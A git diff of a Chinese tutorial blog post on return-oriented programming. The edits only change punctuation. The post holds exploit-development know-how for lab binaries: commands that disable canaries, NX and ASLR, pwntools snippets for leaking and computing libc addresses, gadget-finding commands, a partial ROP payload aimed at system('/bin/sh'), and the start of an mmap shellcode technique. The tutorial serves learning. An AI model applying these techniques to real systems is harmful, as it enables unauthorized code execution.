@@ -10,20 +10,20 @@ tags:
   - ROP
 categories:
   - pwn
-excerpt: ROP的全称为Return-oriented programming(返回导向编程),这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御(比如DEP，ASLR等).
+excerpt: ROP的全称为Return-oriented programming(返回导向编程),这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御(比如DEP, ASLR等).
 
 ---
 
 # 一步一步学ROP笔记
-> 原文地址：[一步一步学ROP](drops.wooyun.org/tips/6597)
+> 原文地址: [一步一步学ROP](drops.wooyun.org/tips/6597)
 
 ## x86 
 
 ### 无保护
 
-* 关掉canary： **-fno-stack-protector** 
-* 关掉NX： **-z execstack** 
-* 关掉PIE： **sudo -s echo 0 > /proc/sys/kernel/randomize_va_space** 
+* 关掉canary:  **-fno-stack-protector** 
+* 关掉NX:  **-z execstack** 
+* 关掉PIE:  **sudo -s echo 0 > /proc/sys/kernel/randomize_va_space** 
 
 ### 绕过NX
 
@@ -46,7 +46,7 @@ $2 = {<text variable, no debug info>} 0xb7e393f0 <__libc_start_main>
 * 看got : **objdump -R level2**
 * 查看目标程序调用的so库 : **ldd level2**
 
-用pwntools：
+用pwntools: 
 
 ```python
 elf = ELF('level2')
@@ -59,14 +59,14 @@ system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
 
 ### 无libc.so
 
-步骤：
+步骤: 
 1. 泄露__libc_start_main地址
 2. 获取libc版本
 3. 获取system地址与/bin/sh的地址
 4. 再次执行源程序
 5. 触发栈溢出执行system(‘/bin/sh’)
 
-DynELF的使用：
+DynELF的使用: 
 
 ```python
 def leak(address):
@@ -90,12 +90,12 @@ system_addr = d.lookup('system', 'libc')
 
 ### gadgets
 
-* 找ROP： **ROPgadget --binary level4 --only "pop|ret"**
-* 过滤： **ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi**
+* 找ROP:  **ROPgadget --binary level4 --only "pop|ret"**
+* 过滤:  **ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi**
 
 ### 通用gadgets part1
 
-`__libc_csu_init()`下：
+`__libc_csu_init()`下: 
 
 ```bash
 .text:0000000000400840                 public __libc_csu_init
@@ -141,7 +141,7 @@ system_addr = d.lookup('system', 'libc')
 .text:00000000004008A4 __libc_csu_init endp   
 ```
 
-因此若要调用`write(1,got_write,8)`,则可这样构造：
+因此若要调用`write(1,got_write,8)`,则可这样构造: 
 
 ```python
 #rbx必须为0,因为call qword ptr [r12+rbx*8]
@@ -164,28 +164,28 @@ payload1 += "\x00"*56
 payload1 += p64(main)
 ```
 
-此外还有一个x64 gadgets，就是:
+此外还有一个x64 gadgets, 就是:
 
 * pop rdi
 * ret
 
-的gadgets。这个gadgets还是在这里，但是是由opcode错位产生的。
+的gadgets.这个gadgets还是在这里, 但是是由opcode错位产生的.
 
 如上的例子中0x4008A2、0x4008A4两句的字节码如下:
 * 0x41 0x5f 0xc3
 
-意思是pop r15，ret，但是恰好pop rdi，ret的opcode如下:
+意思是pop r15, ret, 但是恰好pop rdi, ret的opcode如下:
 * 0x5f 0xc3
 
-因此如果我们指向0x4008A3就可以获得pop rdi，ret的opcode，从而对于单参数函数可以直接获得执行
-与此类似的，还有0x4008A1处的 pop rsi，pop r15，ret
-那么这个有什么用呢？我们知道x64传参顺序是rdi,rsi,rdx,rcx。
-所以rsi是第二个参数，我们可以在rop中配合pop rdi,ret来使用pop rsi，pop r15,ret，这样就可以轻松的调用2个参数的函数。
-综上，就是x64下利用通用gadgets调用一个参数、两个参数、三个参数函数的方法
+因此如果我们指向0x4008A3就可以获得pop rdi, ret的opcode, 从而对于单参数函数可以直接获得执行
+与此类似的, 还有0x4008A1处的 pop rsi, pop r15, ret
+那么这个有什么用呢？我们知道x64传参顺序是rdi,rsi,rdx,rcx.
+所以rsi是第二个参数, 我们可以在rop中配合pop rdi,ret来使用pop rsi, pop r15,ret, 这样就可以轻松的调用2个参数的函数.
+综上, 就是x64下利用通用gadgets调用一个参数、两个参数、三个参数函数的方法
 
 ### 通用gadgets part2
 
-`_dl_runtime_resolve()`下**（在内存中的地址是随机的）**：
+`_dl_runtime_resolve()`下**（在内存中的地址是随机的）**: 
 
 ```bash
 0x7ffff7def200 <_dl_runtime_resolve>:       sub     rsp,0x38
@@ -211,8 +211,8 @@ payload1 += p64(main)
 0x7ffff7def25e <_dl_runtime_resolve+94>:    jmp     r11
 ```
 
-* 可以通过函数的PLT确定_dl_runtime_resolve()地址，其中PLT[2]中跳转的地址就是_dl_runtime_resolve()地址
-* 要利用这个gadget，我们还需要控制rax的值，因为gadget是通过rax跳转的：
+* 可以通过函数的PLT确定_dl_runtime_resolve()地址, 其中PLT[2]中跳转的地址就是_dl_runtime_resolve()地址
+* 要利用这个gadget, 我们还需要控制rax的值, 因为gadget是通过rax跳转的: 
   0x7ffff7def235 <_dl_runtime_resolve+53>:    mov    r11,rax
   ……
   0x7ffff7def25e <_dl_runtime_resolve+94>:    jmp    r11
@@ -221,7 +221,7 @@ payload1 += p64(main)
 
 ## 利用mmap执行任意shellcode
 
-mmap或者mprotect将某块内存改成RWX，然后将shellcode保存到这块内存，然后控制pc跳转过去就可以执行任意的shellcode了。
+mmap或者mprotect将某块内存改成RWX, 然后将shellcode保存到这块内存, 然后控制pc跳转过去就可以执行任意的shellcode了.
 
 ```python
 #mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)
